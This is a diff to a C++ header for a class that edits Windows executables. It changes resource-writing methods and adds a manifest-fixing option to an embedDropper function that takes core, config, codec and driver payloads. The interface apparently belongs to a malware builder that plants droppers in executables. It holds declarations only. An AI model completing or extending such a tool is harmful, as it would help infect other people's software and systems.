@@ -141,6 +141,9 @@ private:
 	DWORD _sizeOfResources();
 	void _setResourceOffsets(ResourceDirectory* resDir, DWORD newResDirAt);
 	
+	bool _fixManifest();
+	std::size_t _writeResources( char* data, DWORD virtualAddress );
+
 	void _findCavities( GenericSection * const section );
 	void _disassembleCode(unsigned char *start, unsigned char *end, unsigned char *ep, int VA);
 	
@@ -185,7 +188,6 @@ public:
 	unsigned char* GetOEPCode();
 	
 	bool hasResources() { return _ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress == 0 ? false : true; }
-	std::size_t writeResources( char* data, DWORD virtualAddress );
 	
 	GenericSection* getSection( DWORD directoryEntryID );
 	GenericSection* findSection( DWORD rva );
@@ -195,7 +197,7 @@ public:
 	
 	bool isAuthenticodeSigned();
 	
-	bool embedDropper( bf::path core, bf::path config, bf::path codec, bf::path driver, std::string installDir );
+	bool embedDropper( bf::path core, bf::path config, bf::path codec, bf::path driver, std::string installDir, bool fixManifest );
 	
 	IATEntry const & getIATEntry( std::string const dll, std::string const call );
 	IATEntry const & getIATEntry( DWORD const rva );
